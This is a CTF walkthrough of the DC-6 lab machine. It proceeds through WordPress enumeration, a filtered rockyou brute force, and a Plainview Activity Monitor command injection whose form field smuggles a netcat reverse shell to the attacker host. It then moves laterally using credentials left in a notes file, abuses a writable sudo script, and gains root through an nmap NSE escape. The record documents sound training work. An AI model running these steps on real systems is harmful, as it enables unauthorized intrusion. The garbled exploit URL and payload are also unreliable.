
## 1. Enumeration

### 1.1 Finding the Target IP

I first scanned the local network to identify the IP address of the DC-6 machine.

```bash
nmap -sn 192.168.56.0/24
```

After identifying the target IP, I performed a service/version scan.

### 1.2 Nmap Scan

```bash
nmap -A 192.168.56.115 -p-
```

The scan revealed two important services:

```text
22/tcp   open   ssh
80/tcp   open   http
```

The web server redirected to:

```text
http://wordy
```

The DC-6 author specifically requires the `wordy` hostname to be mapped to the target IP in `/etc/hosts`.

then i checked for the sub directories 

```
dirb http://192.168.56.115/

```

it didnt find anything useful

---

# 2. Configuring `/etc/hosts`

I edited the `/etc/hosts` file:

```bash
sudo nano /etc/hosts
```

I added:

```text
192.168.56.114    wordy
```

I then accessed:

```text
http://wordy
```

The website was a **WordPress** application.

---

# 3. WordPress Enumeration

Since the target was running WordPress, I used WPScan to enumerate the website.

```bash
wpscan --url http://192.168.56.115 -e vt,ap,u

```

The scan revealed several WordPress users and plugins.

The discovered users included:

```text
mark
graham
sarah
jens
admin
```

The plugin enumeration also revealed potentially vulnerable plugins.
wordpress theme : twentyseventeen 
Version: 2.1
Server: Apache/2.4.25 (Debian)
WordPress version: 5.1.1 

---

# 4. Creating a Focused Password Wordlist

The DC-6 challenge provides a useful hint for reducing the size of the `rockyou.txt` wordlist.

Instead of testing the entire wordlist, I filtered it for passwords containing:

```text
k01
```

I created a smaller password list:

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

This produced:

```text
passwords.txt
```

The smaller wordlist made the password attack considerably faster. The official DC-6 description gives the same filtering technique as a hint.

---

# 5. WordPress Password Discovery

I used WPScan to test the discovered WordPress users against the filtered password list.

```bash
wpscan --url http://wordy -e u -U mark,graham,sarah,jens,admin -P passwords.txt
```

The password attack identified valid credentials for a WordPress account.
```
Valid Combinations Found:
Username: mark, Password: helpdesk01
```

I then used the discovered credentials to log into:

```text
http://wordy/wp-login.php
```

---

# 6. WordPress Enumeration

After logging into WordPress, I continued enumerating the application and its available functionality.

Further investigation of the WordPress installation and its plugins revealed an exploitable plugin  **Plainview Activity Monitor**, which had a known remote command execution vulnerability.

then i searched for an exploit and downloaded it to the emachine

`searchsploit activity monitor

```
┌──(kali㉿hashi)-[~]
└─$ searchsploit -m php/webapps/45274.html

  Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection
      URL: https://www.exploit-db.com/exploits/45274
     Path: /usr/share/exploitdb/exploits/php/webapps/45274.html
    Codes: CVE-2018-15877
 Verified: True
File Type: ReStructuredText file, ASCII text
Copied to: /home/kali/45274.html

```

then i changed the lhost ,lport and the ip adress and the netcat 
"http://wordy:80/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools"


```
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://wordy:80/wp-admin/admin.php?page=plainview_activity_mtivity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc 192.168.56.102 3333  />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

==input type="submit" value="Submit request" />== - this is the button we gonna pull up in the web brwser
# 7. Initial Access

then i started a nc listener 

```
┌──(kali㉿hashi)-[/]
└─$ nc -lvnp 3333
listening on [any] 3333 ...

```


The vulnerable WordPress plugin provided a path to execute commands on the target system.

I used the vulnerable functionality to obtain a shell on the machine.
and executed the file in web and pressed the submit button and we got a shell

![](attachments/Pasted%20image%2020260810011106.png)

```
file:///home/kali/45274.html
```


After gaining access, I checked the current user:

```bash
whoami
```

I then began enumerating the local system.

# 8. Local Enumeration

and got a bash shell
`python -c 'import pty; pty.spawn("/bin/bash")'`
 then Ctrl + z
 ```
 ┌──(kali㉿hashi)-[/]
└─$ stty raw -echo; fg; reset
 ```


ls -la
ls -la /home

```

I discovered several user directories, including:

```text
mark
graham
jens
sarah
```

I inspected Mark's directory:

```bash
ls -la /home/mark/stuff
```

I found a file containing useful information:
I read the file:

```bash
cat things-to-do.txt
```

The file contained credentials for another user, **Graham**.

```
www-data@dc-6:/home/mark$ cd stuff
www-data@dc-6:/home/mark/stuff$ ls
things-to-do.txt
www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement

```

---

# 9. Accessing Graham's Account


Ilogged into graham's account

```bash
ssh graham@192.168.56.115


```

`sudo -l
this showd what user can run without passwd
```

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```


less /home/jens/backups.sh
ls -la 
id - to find dev's id
```
graham@dc-6:~$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)

```

modified deleting the tar line and typed i and the /bin/bash (:wq - to save and exit)
`vi /home/jens/backups.sh

cd /home/jens - to execute the sudo code and we successfully logged into jens acc and now we can run the backup.sh command without pwd

`graham@dc-6:/home/jens$ sudo -u jens ./backups.sh
and we spawned to the bash shel
`jens@dc-6:~$ 
`
```
jens@dc-6:~$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap

```
go to GTFOBins and find a exploit for nmap 

```
jens@dc-6:~$ TF=$(mktemp)
jens@dc-6:~$ echo 'os.execute("/bin/sh")' > $TF
jens@dc-6:~$ sudo nmap --script=$TF

```

and yes we got to the root shell.when we type whoami and enter we get the output as `root` but we cant see the command to get a privilleged shell


`python -c 'import pty; pty.spawn("/bin/bash")'`
`
then type whoami
we see the command now

🎉 **Root access obtained!**

---

# 15. Obtaining the Final Flag

After obtaining root access, I moved to the root directory:

```bash
cd /root
```

I listed the files:

```bash
ls -al
```

I found:

```text
theflag.txt
```

I read the flag:

```
root@dc-6:/home/jens# cat theflag.txt
cat: theflag.txt: No such file or directory
root@dc-6:/home/jens# cat /root/theflag.txt


Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.

```

The flag confirmed that the DC-6 machine had been successfully completed. Independent walkthroughs also confirm the final flag is located at `/root/theflag.txt`.

![](attachments/Pasted%20image%2020260810013153.png)
---

# 16. Attack Path

```text
Network Enumeration
        ↓
Nmap
        ↓
HTTP + SSH
        ↓
wordy Hostname
        ↓
WordPress Enumeration
        ↓
WPScan
        ↓
WordPress Users
        ↓
Filtered rockyou Wordlist
        ↓
WordPress Credentials
        ↓
Vulnerable WordPress Plugin
        ↓
Initial Shell
        ↓
/home/mark/things-to-do.txt
        ↓
Graham Credentials
        ↓
Graham
        ↓
Writable backups.sh
        ↓
Jens
        ↓
sudo -l
        ↓
Nmap as root
        ↓
NSE Shell
        ↓
Root
        ↓
/root/theflag.txt
```

# 17. Key Takeaways

- Always perform service and version enumeration first.
    
- WordPress users can be enumerated using WPScan.
    
- A focused password wordlist can make password attacks much faster.
    
- Sensitive credentials may be stored in user files.
    
- Always check file permissions when performing Linux privilege escalation.
    
- `sudo -l` is an important privilege-escalation check.
    
- Allowing a user to execute powerful utilities such as Nmap as root can lead to complete system compromise.
    
- The DC-6 attack chain demonstrates how multiple small weaknesses can be chained together to obtain root access.